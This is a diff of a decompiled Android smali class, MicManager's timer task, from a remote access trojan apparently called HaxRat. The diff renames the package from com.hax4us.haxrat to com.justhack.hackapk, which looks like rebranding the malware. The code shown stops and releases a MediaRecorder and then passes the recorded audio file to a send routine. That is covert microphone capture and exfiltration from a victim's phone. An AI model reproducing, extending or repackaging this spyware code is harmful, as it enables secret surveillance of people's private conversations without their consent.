@@ -1,11 +1,11 @@
-.class Lcom/hax4us/haxrat/MicManager$100000000;
+.class Lcom/justhack/hackapk/MicManager$100000000;
 .super Ljava/util/TimerTask;
 .source "MicManager.java"
 
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/MicManager;
+    value = Lcom/justhack/hackapk/MicManager;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -44,19 +44,19 @@
     .line 56
     move-object v0, p0
 
-    sget-object v2, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v2, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V
 
     .line 57
-    sget-object v2, Lcom/hax4us/haxrat/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v2, Lcom/justhack/hackapk/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V
 
     .line 58
     const-string v2, "MI"
 
-    sget-object v3, Lcom/hax4us/haxrat/MicManager;->audiofile:Ljava/io/File;
+    sget-object v3, Lcom/justhack/hackapk/MicManager;->audiofile:Ljava/io/File;
 
     invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z
 
